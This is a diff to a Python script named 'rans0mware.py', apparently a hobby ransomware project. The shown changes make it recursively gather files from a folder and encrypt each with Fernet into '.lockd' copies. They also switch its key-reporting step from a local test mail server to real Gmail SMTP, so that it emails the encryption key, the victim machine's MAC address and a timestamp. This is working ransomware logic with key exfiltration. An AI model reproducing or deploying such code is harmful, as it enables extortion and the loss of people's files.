@@ -27,28 +27,29 @@ if os.path.exists("Decrypted"):
 
 def encrpytFiles(fl):
     for i in range(len(fl)):
+        if os.path.isdir(fl[i]):
+            continue
         with open(fl[i], "rb") as file:
             f = file.read()
             data = bytes(f)
-        name = fl[i].split("\\")[-1]
+        name = "\\".join(fl[i].split("\\")[-2:])
         if not os.path.exists("Encrypted"):
             os.mkdir("Encrypted")
+        if not os.path.exists("Encrypted\\" + name.split("\\")[-2]):
+            os.mkdir("Encrypted\\" + name.split("\\")[-2])
         with open("Encrypted\\" + name + ".lockd", "wb") as locked:
             locked.write(fernet.encrypt(data))
 
 
-def getFiles(dir=None):
+def getFiles(dir=os.path.abspath("Test Files")):
     _files = []
     for file in os.listdir(dir):
-        passes = ["rans0mware.py", ".idea", "key.yek", "decrypter.py", "Encrypted", "Decrypted", "googleapppasword.txt"]
-        if file in passes:
-            continue
         if os.path.isdir(file):
-            recFiles = getFiles(file)
+            recFiles = getFiles(os.path.join(dir,file))
             for f in recFiles:
-                _files.append(".\\" + file + "\\" + f)
+                _files.append(os.path.abspath(file))
         else:
-            _files.append(file)
+            _files.append(os.path.join(dir,file))
     return _files
 
 
@@ -61,11 +62,10 @@ encrpytFiles(files)
 if sendMail.lower() == "y":
     context = ssl.create_default_context()
     message = EmailMessage()
-    with smtplib.SMTP("localhost", 1025) as server:
-        # with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
+    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
         mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
 
-        sender = "anonmail@localhost.com"
+        sender = "mrsfanonmail@gmail.com"
         receiver = input("Please write your email adress: ")
         regex = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
         print("Checking email...")
@@ -79,8 +79,8 @@ if sendMail.lower() == "y":
         processID = uuid.uuid4()
 
         message.set_content("".join(
-            ["key: ", str(key), "\nfrom: ", mac, "\nat: ", datetime.datetime.today().strftime('%Y-%m-%d %H:%M:%S'),
-             "\nID: ", str(processID)]))
+            ["key: ", str(key), "\nfrom: ", mac, "\ndate: ", datetime.datetime.today().strftime('%Y-%m-%d %H:%M:%S'),
+             "\nprocessID: ", str(processID)]))
         message["Subject"] = "Rans0mware Key From A PC"
         message["From"] = sender
         message["To"] = receiver
